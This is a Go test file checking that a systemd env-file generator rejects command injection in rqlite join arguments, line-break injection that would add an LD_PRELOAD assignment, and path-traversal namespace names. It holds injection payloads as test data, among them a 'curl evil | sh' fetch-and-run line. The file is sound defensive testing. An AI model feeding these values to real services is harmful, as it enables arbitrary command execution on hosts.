package systemd

import (
	"os"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
)

// What the spawner really writes for rqlite still goes through.
func TestGenerateEnvFile_acceptsTheRealRQLiteEnv(t *testing.T) {
	m, _ := newFakeManager(t)
	env := map[string]string{
		"HTTP_ADDR":     "10.0.0.2:10000",
		"RAFT_ADDR":     "10.0.0.2:10001",
		"HTTP_ADV_ADDR": "10.0.0.2:10000",
		"RAFT_ADV_ADDR": "10.0.0.2:10001",
		"JOIN_ARGS":     "-join 10.0.0.1:10001,10.0.0.3:10001 -join-as orama",
		"DATA_DIR":      "/opt/orama/.orama/data/namespaces/acme/rqlite/12D3KooWAbc",
		"EXTRA_ARGS":    "-raft-election-timeout 5s -auth /opt/orama/.orama/data/namespaces/acme/rqlite/auth.json",
	}
	if err := m.GenerateEnvFile("acme", "12D3KooWAbc", ServiceTypeRQLite, env); err != nil {
		t.Fatalf("a valid rqlite env was refused: %v", err)
	}
	// And an empty JOIN_ARGS, the first node's.
	env["JOIN_ARGS"] = ""
	if err := m.GenerateEnvFile("acme", "12D3KooWAbc", ServiceTypeRQLite, env); err != nil {
		t.Fatalf("an empty JOIN_ARGS was refused: %v", err)
	}
}

// The rqlite unit runs `sh -c '… ${JOIN_ARGS} …'`: systemd substitutes the
// value into the script, so shell syntax in it is a command.
func TestGenerateEnvFile_refusesShellSyntaxForAShellUnit(t *testing.T) {
	for _, value := range []string{
		"-join 10.0.0.1:10001; curl evil | sh",
		"-join $(id)",
		"-join `id`",
		"-join 10.0.0.1:10001 && touch /tmp/x",
		"-join 10.0.0.1:10001 > /etc/x",
		"-join ${HOME}",
		"-join *",
	} {
		m, _ := newFakeManager(t)
		err := m.GenerateEnvFile("acme", "n1", ServiceTypeRQLite, map[string]string{"JOIN_ARGS": value})
		if err == nil {
			t.Errorf("JOIN_ARGS %q was written into the rqlite unit's shell command line", value)
		}
	}
}

// A service whose unit reads the value as data only may carry more, but never
// a line break: that writes an assignment of its own.
func TestGenerateEnvFile_refusesWhatBreaksTheFile(t *testing.T) {
	for name, env := range map[string]map[string]string{
		"newline":   {"GATEWAY_CONFIG": "/x\nLD_PRELOAD=/tmp/evil.so"},
		"CR":        {"GATEWAY_CONFIG": "/x\rY=1"},
		"NUL":       {"GATEWAY_CONFIG": "/x\x00"},
		"quote":     {"GATEWAY_CONFIG": `"/x`},
		"backslash": {"GATEWAY_CONFIG": `/x\`},
		"bad key":   {"A=B": "1"},
		"empty key": {"": "1"},
	} {
		m, _ := newFakeManager(t)
		if err := m.GenerateEnvFile("acme", "n1", ServiceTypeGateway, env); err == nil {
			t.Errorf("%s: written", name)
		}
	}
	m, _ := newFakeManager(t)
	if err := m.GenerateEnvFile("acme", "n1\nX=1", ServiceTypeGateway, nil); err == nil {
		t.Error("a node ID with a newline was written")
	}
}

// The namespace names a directory under the namespace base, created before
// anything else; an unchecked one was a path.
func TestGenerateEnvFile_refusesANamespaceThatIsNotAName(t *testing.T) {
	for _, ns := range []string{"", "../../etc", "a/b", ".hidden", "a b", strings.Repeat("a", 65)} {
		m, _ := newFakeManager(t)
		if err := m.GenerateEnvFile(ns, "n1", ServiceTypeGateway, map[string]string{"A": "1"}); err == nil {
			t.Errorf("namespace %q was accepted", ns)
		}
		if ns != "" {
			if _, err := os.Stat(filepath.Join(m.namespaceBase, ns)); err == nil {
				t.Errorf("namespace %q created a directory before it was refused", ns)
			}
		}
	}
}

// ShellInterpolatedServices has to name every service whose shipped unit
// substitutes an env variable into a shell script, or the shell check is
// skipped for it.
func TestShellInterpolatedServices_coversEveryShellTemplate(t *testing.T) {
	shellWithVar := regexp.MustCompile(`^Exec\w*=[-@:+!]*/bin/(ba)?sh\s+(-\w+\s+)*-c\s+'[^']*\$\{?[A-Za-z_]`)
	templates, err := filepath.Glob(filepath.Join(unitDir(t), "orama-namespace-*@.service"))
	if err != nil || len(templates) == 0 {
		t.Fatalf("no namespace templates found: %v", err)
	}
	for _, path := range templates {
		body := strings.ReplaceAll(readUnit(t, filepath.Base(path)), "\\\n", " ")
		service := strings.TrimSuffix(strings.TrimPrefix(filepath.Base(path), "orama-namespace-"), "@.service")
		for _, line := range strings.Split(body, "\n") {
			if shellWithVar.MatchString(strings.TrimSpace(line)) && !ShellInterpolatedServices[ServiceType(service)] {
				t.Errorf("%s substitutes env values into a shell script and is not in ShellInterpolatedServices", filepath.Base(path))
			}
		}
	}
}
